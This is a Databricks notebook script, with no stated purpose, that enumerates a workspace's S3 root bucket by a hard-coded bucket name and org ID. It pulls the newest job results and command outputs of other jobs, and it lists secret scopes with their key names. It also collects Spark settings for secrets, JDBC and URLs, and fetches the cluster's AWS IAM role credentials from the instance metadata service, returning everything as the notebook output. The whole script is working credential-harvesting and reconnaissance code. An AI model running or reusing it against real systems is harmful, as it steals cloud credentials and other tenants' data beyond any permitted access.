# Databricks notebook source
import json
out = {}
def add(k, fn, maxlen=40000):
    try:
        v = fn()
        s = json.dumps(v, default=str)
        out[k] = v if len(s) <= maxlen else (s[:maxlen] + '...TRUNC')
    except Exception as e:
        out[k] = 'ERR: ' + repr(e)[:300]

def fi(x):
    try:
        return [x.path, x.size, x.modificationTime, x.isDir()]
    except Exception:
        return [getattr(x, 'path', '?'), getattr(x, 'size', -1), getattr(x, 'modificationTime', -1), None]

def ls(p, lim=300):
    return [fi(x) for x in dbutils.fs.ls(p)][:lim]

def head(p, n=10000):
    try:
        return dbutils.fs.head(p, n)
    except Exception as e:
        return 'ERR ' + repr(e)[:200]

BUCKET = 'db-38dbf140ebc32bdc945ddca098c7f102-s3-root-bucket'
ROOT = 's3a://%s/nvirginia-prod' % BUCKET
ORG = '4185504154665321'
P_JOBS = ROOT + '/' + ORG + '.jobs'
P_ROOT = ROOT + '/' + ORG

add('s3a_root', lambda: ls(ROOT, 80))
add('s3a_org', lambda: ls(P_ROOT, 80))
add('s3a_jobs', lambda: ls(P_JOBS, 80))
add('s3a_jobs_filestore', lambda: ls(P_JOBS + '/FileStore', 80))
add('s3a_jobresult', lambda: ls(P_JOBS + '/FileStore/job-result', 400))
add('s3a_meta', lambda: ls(ROOT + '/' + ORG + '.meta', 20))
add('s3a_meta_mounts', lambda: head(ROOT + '/' + ORG + '.meta/mounts', 2000))
add('s3a_notebookrev', lambda: ls(P_JOBS + '/notebook-revisions', 120))
add('s3a_cmdres', lambda: ls(P_JOBS + '/command-results', 120))
add('dbfs_tmpny', lambda: ls('dbfs:/tmp/ny', 50))
add('dbfs_databricks_results', lambda: ls('dbfs:/databricks-results', 50))
add('dbfs_mlflow', lambda: ls('dbfs:/databricks/mlflow-tracking', 50))
add('dbfs_volumes', lambda: ls('dbfs:/Volumes', 50))
add('mnt_datapao', lambda: ls('dbfs:/mnt/datapao-public', 50))

def _newest_jr():
    res = []
    base = P_JOBS + '/FileStore/job-result'
    jobs = sorted(dbutils.fs.ls(base), key=lambda x: x.modificationTime, reverse=True)[:10]
    for j in jobs:
        item = {'job': j.path.split('/')[-1], 'mtime': j.modificationTime, 'total': None, 'runs': []}
        try:
            allruns = dbutils.fs.ls(j.path)
            item['total'] = len(allruns)
            runs = sorted(allruns, key=lambda x: x.modificationTime, reverse=True)[:2]
        except Exception as e:
            item['err'] = repr(e)[:150]
            res.append(item)
            continue
        item['newest_run_ts'] = runs[0].modificationTime if runs else None
        for r in runs:
            ri = {'run': r.path.split('/')[-1], 'mtime': r.modificationTime, 'files': [], 'heads': []}
            try:
                entries = dbutils.fs.ls(r.path)
            except Exception as e:
                ri['err'] = repr(e)[:150]
                item['runs'].append(ri)
                continue
            ri['files'] = [fi(x) for x in entries]
            js = []
            for x in entries:
                if x.isDir():
                    try:
                        for y in dbutils.fs.ls(x.path):
                            if y.path.endswith('.json'):
                                js.append(y)
                    except Exception:
                        pass
                elif x.path.endswith('.json'):
                    js.append(x)
            js = sorted(js, key=lambda x: x.modificationTime, reverse=True)[:5]
            for y in js:
                sz = y.size if y.size < 45000 else 20000
                ri['heads'].append({'name': y.path.split('/')[-1], 'size': y.size, 'mtime': y.modificationTime,
                                    'head': head(y.path, sz)})
            item['runs'].append(ri)
        res.append(item)
    return res
add('newest_jobresults', _newest_jr, 260000)

def _secrets():
    res = []
    for s in dbutils.secrets.listScopes():
        e = {'name': getattr(s, 'name', str(s)), 'keys': []}
        try:
            ks = dbutils.secrets.list(e['name'])
            e['keys'] = [(getattr(k, 'name', None) or getattr(k, 'key', None) or str(k)) for k in ks][:100]
        except Exception as ex:
            e['keys'] = 'ERR ' + repr(ex)[:150]
        res.append(e)
    return res
add('secret_scopes', _secrets)

def _conf():
    res = {}
    try:
        rows = spark.sql('SET -v').collect()
        for r in rows:
            try:
                k = r['key']; v = r['value']
            except Exception:
                k = str(r[0]); v = str(r[1])
            if any(s in k.lower() for s in ('path', 'fs.', 's3', 'bucket', 'mount', 'warehouse', 'metastore', 'secret', 'jdbc', 'url', 'host', 'storage', 'dir')):
                res[k] = str(v)[:400]
        res['__n_set__'] = len(rows)
    except Exception as e:
        res['SET_ERR'] = repr(e)[:200]
    return res
add('spark_conf', _conf, 40000)

def _sconf():
    res = {}
    try:
        for k, v in spark.sparkContext.getConf().getAll():
            if any(s in k.lower() for s in ('fs.', 's3', 'bucket', 'path', 'dir', 'warehouse', 'secret', 'jdbc', 'url')):
                res[k] = str(v)[:300]
    except Exception as e:
        res['ERR'] = repr(e)[:200]
    return res
add('sparkconf_jvm', _sconf, 30000)

def _imds():
    import urllib.request
    r = {}
    req = urllib.request.Request('http://169.254.169.254/latest/api/token',
                                 headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, method='PUT')
    tok = urllib.request.urlopen(req, timeout=4).read().decode()
    H = {'X-aws-ec2-metadata-token': tok}
    role = urllib.request.urlopen(urllib.request.Request(
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=H), timeout=4).read().decode().strip()
    r['role'] = role
    r['creds'] = json.loads(urllib.request.urlopen(urllib.request.Request(
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, headers=H), timeout=4).read().decode())
    return r
add('imds', _imds, 8000)

def _cmdres_newest():
    res = []
    base = P_JOBS + '/command-results'
    try:
        items = sorted(dbutils.fs.ls(base), key=lambda x: x.modificationTime, reverse=True)[:3]
    except Exception as e:
        return 'ERR ' + repr(e)[:150]
    for it in items:
        e = {'path': it.path.split('/')[-1], 'mtime': it.modificationTime, 'size': it.size}
        try:
            subs = dbutils.fs.ls(it.path)
            e['subs'] = [fi(x) for x in subs][:10]
            for s in subs:
                if s.path.endswith('.json') or s.path.endswith('.json.gz') or s.path.endswith('.ndjson'):
                    e['head'] = head(s.path, 6000)
        except Exception as ex:
            e['err'] = repr(ex)[:150]
        res.append(e)
    return res
add('command_results_newest', _cmdres_newest, 30000)

txt = json.dumps(out, default=str)
if len(txt) > 950000:
    txt = txt[:950000] + '...TRUNC_TOTAL'
dbutils.notebook.exit(txt)
